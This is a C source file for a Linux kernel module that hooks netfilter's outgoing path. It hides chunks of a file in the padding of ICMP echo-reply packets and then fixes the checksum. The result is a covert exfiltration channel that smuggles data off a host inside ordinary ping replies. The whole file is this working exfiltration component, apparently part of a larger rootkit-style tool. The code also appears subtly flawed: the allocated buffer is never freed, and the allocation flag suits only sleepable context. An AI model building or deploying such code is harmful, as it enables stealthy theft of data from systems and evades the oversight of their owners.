#include "netfilter.h"
#include "../net/checksum.h"
#include "../fs/payload_generator.h"

#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>

#define ICMPHDR_TIMESTAMP_FIELD_SIZE (8)

static struct nf_hook_ops netfilter_hook;

get_payload_func_t get_payload_func = NULL;

/**
 * implementation of skb_put_data (was introduced in later kernel versions).
 */
static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, unsigned int len)
{
	void *tmp = skb_put(skb, len);
	memcpy(tmp, data, len);
	return tmp;
}

/**
 * this is the netfilter hook function. this function will be invoked whenever a packet is 
 * about to "hit the wire" and to be sent over the network. 
 * 
 * whenever an outgoing ICMP-reply packet is being passed to the hook, a chunk of the file
 * we wish to send is injected into it. note that the payload must be in the packet's padding,
 * otherwise the requesting side won't parse the packet as a valid reply (even if the checksum)
 * is correct. once the chunk is injected into the packet, the ICMP checksum is re-calculated
 * and the packet is being transmitted.
 * 
 * since we don't have anything smart to do if we fail, every failure in this function will 
 * cause it to return NF_ACCEPT, telling netfilter that everything is okay and that the 
 * packet should be transmitted.
 */
unsigned int nf_sendfile_hook(void *priv,
                              struct sk_buff *skb,
                              const struct nf_hook_state *state)
{
    if (NULL == get_payload_func) {
        // as long as we don't have a way to get our payloads, we don't 
        // have much to do.
        return NF_ACCEPT;
    }

    struct iphdr *ip_layer = ip_hdr(skb);
    if (IPPROTO_ICMP != ip_layer->protocol) {
        // ignore any non-ICMP packets.
        return NF_ACCEPT;
    }

    struct icmphdr *icmp_layer = icmp_hdr(skb);
    if (ICMP_ECHOREPLY != icmp_layer->type) {
        // ignore any non-ICMP-echoreply packets.
        return NF_ACCEPT;
    }
    
    size_t default_payload_size = get_default_payload_chunk_size();
    size_t actual_payload_size = 0;
    char* payload_data = (char*)kmalloc(default_payload_size, GFP_KERNEL);
    if (NULL == payload_data) {
        return NF_ACCEPT;
    }

    // get the payload we wish to send. payload_data acts as an output 
    // parameter to which get_payload_func copies the payload.
    if (get_payload_func(payload_data, &actual_payload_size)) {
        return NF_ACCEPT;
    }

    // since we want our payload to be in the packet's padding, we want to 
    // calculate the size of the ICMP packet BEFORE writing the payload to 
    // the skbuff. otherwise, skb_put_data will update skb->len to include 
    // our payload.
    ssize_t icmp_and_up_size = skb->len - sizeof(struct iphdr);

    // min(default_payload_size, actual_payload_size) as there might be a 
    // case that the payload is smaller than the default chunk size.
    skb_put_data_impl(skb, payload_data, min(default_payload_size, actual_payload_size));

    icmp_layer->checksum = 0;
    icmp_layer->checksum = icmp_csum((const void *)icmp_layer, icmp_and_up_size);

    return NF_ACCEPT;
}

void register_nf_hook(void)
{
    netfilter_hook.hook = nf_sendfile_hook;
    netfilter_hook.priority = INT_MIN;
    netfilter_hook.hooknum = NF_INET_POST_ROUTING;
    netfilter_hook.pf = PF_INET;

    nf_register_net_hook(&init_net, &netfilter_hook);
}

void unregister_nf_hook(void)
{
    nf_unregister_net_hook(&init_net, &netfilter_hook);
}
